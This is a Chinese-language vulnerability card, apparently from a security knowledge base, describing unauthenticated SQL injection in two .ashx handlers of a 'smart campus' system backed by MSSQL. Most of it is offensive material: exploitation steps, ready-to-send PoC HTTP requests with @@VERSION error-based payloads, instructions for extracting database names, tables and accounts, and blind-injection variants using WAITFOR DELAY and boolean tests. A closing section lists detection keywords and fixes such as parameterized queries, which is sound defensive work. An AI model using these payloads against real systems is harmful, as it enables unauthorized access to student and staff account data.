---
id: web-generic-sqli-dotnet-handler-mssql-param-concat-version
title: .NET Handler 参数直拼 MSSQL：getCities/getPersonInfo 用 @@VERSION 报错回显注入
type: scenario
domain: web
path: web/generic/sqli
technique: dotnet-handler-mssql-param-concat-injection
aliases:
- 智慧校园 SQL 注入
- Scity.ashx 注入
- ArrangeMealsService.ashx 注入
- provinceId 注入
- accountNo 注入
- '@@VERSION 报错注入'
tags:
- sqli
- dotnet
- mssql
- error-based
- ashx
- handler
- version-error
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V38
  verified_at: '2026-11-05T06:02:52+08:00'
  notes: 已通读原文并逐张核对19张图：SCity.ashx getCities 分支 provinceId 直拼 SELECT * FROM City ... ProvinceId=<val>（数字上下文），ArrangeMealsService.ashx getPersonInfo 分支 accountNo 拼入 V_IM_Account 的 AccountNo='<val>'（字符串上下文），两处均未参数化；实测 provinceId=1+@@VERSION-- 与 accountNo=test' and 1=@@VERSION-- 均回显 MSSQL 2008 R2 类型转换错误，且两 Handler 均为 IHttpHandler 未带 token 直接可达，与卡一致。frontmatter 无 sources/source_url；未在本机复跑。
---

## 一句话结论

某智慧校园系统的两个 `.ashx` Handler 把请求参数直接拼进 MSSQL 语句：`Scity.ashx` 在 `action=getCities` 时把 `provinceId` 拼到 `SELECT * FROM City WHERE ProvinceId IS NOT NULL AND ProvinceId=<provinceId>`，`ArrangeMealsService.ashx` 在 `action=getPersonInfo` 时把 `accountNo` 拼到 `... AND AccountNo = '<accountNo>'`；两处都用 `@@VERSION` 构造类型转换/语法错误，错误信息回显 `Microsoft SQL Server 2008 R2 ...`，确认注入并可用于报错/布尔盲注取数。

## 原理

- `Scity.ashx` 的 `ProcessRequest`：读取 `action`，等于 `getCities` 时取 `all` 与 `provinceId`，执行 `DBProvider.ExecuteDataTable(CommandType.Text, "SELECT * FROM City WHERE ProvinceId IS NOT NULL AND ProvinceId=" + strProvinceId)`。`provinceId` 处于数字上下文，无需引号闭合。
- `ArrangeMealsService.ashx` 的 `ProcessRequest`：`action=getPersonInfo` 时取 `accountNo`，用 `StringBuilder` 拼出 `SELECT * FROM V_IM_Account WHERE PersonState = 0 AND AccountNo = '<accountNo>'`，`accountNo` 处于单引号字符串上下文，需要 `'` 闭合。
- 两处都没有参数化、没有类型校验（`provinceId` 未 `Convert.ToInt32` 后再拼，而是先拼后执行）；`CommandType.Text` 直接把拼接结果交给数据库。
- MSSQL 报错原语：`1+@@VERSION--`（数字上下文）或 `test' AND 1=@@VERSION--`（字符串上下文）会让 `@@VERSION` 的字符串结果参与整数运算/比较，触发“将 nvarchar 值 'Microsoft SQL Server 2008 R2 ...' 转换成数据类型 int 时失败”；错误原文包含完整版本、补丁、主机名，直接回显到响应。
- 该原语同时确认了三件事：参数进入 SQL 语法层、数据库为 MSSQL、当前连接可执行 `@@VERSION`；后续可把 `@@VERSION` 换成 `DB_NAME()`、`SYSTEM_USER`、子查询或布尔条件，做报错/布尔/时间盲注。
- 文章截图中两个 Handler 的请求都不需要认证（未带 token、未走 HandleBase），说明它们是独立的 IHttpHandler，攻击面为未授权。

## 触发条件

- 目标为该智慧校园系统（WebYKT 系列 DLL / `.ashx` Handler 架构）。
- `Scity.ashx`、`ArrangeMealsService.ashx` 可访问，`action` 与注入参数可控。
- 数据库为 MSSQL（`@@VERSION`、`--` 注释、`+` 字符串拼接语义）。
- 应用未关闭详细错误（文章响应直接回显 `resultMsg`/错误文本）。

## 利用步骤

1. 请求 `POST /ashx/Scity.ashx`，body `action=getCities&all=1&provinceId=1`，确认返回城市数据。
2. 注入 `provinceId=1+@@VERSION--`，响应出现 `将 nvarchar 值 'Microsoft SQL Server 2008 R2...' 转换成数据类型 int 时失败`，确认数字上下文注入。
3. 请求 `POST /ashx/APP/DCGL/ArrangeMealsService.ashx`，body `action=getPersonInfo&accountNo=test`，确认正常/空结果。
4. 注入 `accountNo=test' and 1=@@VERSION--`，响应 `resultMsg` 出现同样的类型转换错误，确认字符串上下文注入。
5. 用报错子查询或布尔条件取库名、表名、账号；`--` 注释掉原语句剩余部分，注意 URL 编码空格与 `+`。
6. 无回显时改用时间盲注（`WAITFOR DELAY '0:0:5'`）或布尔差异（`and 1=1` vs `and 1=2`）。

## PoC

```http
### 第一处：Scity.ashx 数字上下文
POST /ashx/Scity.ashx HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

action=getCities&all=1&provinceId=1+@@VERSION--

### 响应（文章截图）：
### 将 nvarchar 值 'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) ...' 转换成数据类型 int 时失败。

### 第二处：ArrangeMealsService.ashx 字符串上下文
POST /ashx/APP/DCGL/ArrangeMealsService.ashx HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

action=getPersonInfo&accountNo=test' and 1=@@VERSION--

### 响应（文章截图）：
### {"resultCode":-1,"resultMsg":"在将 nvarchar 值 'Microsoft SQL Server 2008 R2 ...' 转换成数据类型 int 时失败。","total":0,"rows":[]}
```

```text
拼接后的 SQL：
  第一处：SELECT * FROM City WHERE ProvinceId IS NOT NULL AND ProvinceId=1+@@VERSION--
  第二处：SELECT * FROM V_IM_Account WHERE PersonState = 0 AND AccountNo = 'test' and 1=@@VERSION--'

文章附两处请求/响应截图；本卡未在本机复现。
```

## 变体与关联

- 变体（注入位置）：`provinceId` 数字上下文可直接 `1 AND ...`、`1;WAITFOR...`；`accountNo` 字符串上下文需 `'` 闭合，可用 `' OR '1'='1`、`' AND 1=@@VERSION--`。
- 变体（报错函数）：MSSQL 可用 `@@VERSION`、`CONVERT(int, @@VERSION)`、`CAST`、`1/0`、`db_name()` 等制造类型/除零错误；错误文案不同但都能带出数据。
- 变体（盲注）：`AND 1=1`/`AND 1=2` 布尔差异；`WAITFOR DELAY '0:0:5'` 时间盲注；堆叠语句需 `CommandType.Text` 与驱动支持（SQL Server 默认可堆叠，但 `ExecuteDataTable` 行为需实测）。
- 关联：[[web-generic-sqli-error-based-extraction]] 是报错注入的通用方法；本卡是 .NET `IHttpHandler` + MSSQL 的具体落点。
- 边界：错误页被定制为通用文案时，`@@VERSION` 回显失效，需改盲注；数据库非 MSSQL 时 `@@VERSION`/`WAITFOR` 不适用；参数若被 WAF 拦截 `--` 或空格，需换注释/编码。

## 检测与防御

- 请求检测：Handler 参数出现 `@@VERSION`、`WAITFOR`、`--`、`'`、`+`、`CONVERT(`、`CAST(`、`DB_NAME(`、`SYSTEM_USER`；`provinceId`/`accountNo` 非预期类型或超长；同一接口短时间布尔/时间探测。
- 主机检测：MSSQL 错误日志出现“转换成数据类型 int 时失败”、`@@VERSION`、`WAITFOR`；应用日志记录完整 SQL 与异常并返回前端；数据库连接账户权限过高。
- 修复：`provinceId` 用 `int.TryParse`/参数化 `@provinceId`；`accountNo` 用 `SqlParameter` 绑定，禁止 `StringBuilder`/字符串拼接 SQL；`CommandType.Text` 的 SQL 全部参数化。
- 修复：关闭详细错误回显，统一返回通用错误码；数据库账号最小权限，禁用不必要的 `WAITFOR`/堆叠能力（应用层限制）。
- 加固：WAF 拦截注入关键字与异常符号；对 `.ashx` Handler 统一接入鉴权（文章两处未走 `HandleBase`）；上线前用 SAST/污点分析扫 `Request.Params` → SQL 执行路径。
- 审计：搜索 `Request.Params[`/`Request.QueryString[`/`Request.Form[` 后直接拼 SQL 的 Handler；检查所有 `DBProvider.ExecuteDataTable`/`ExecuteNonQuery` 调用点的参数来源。
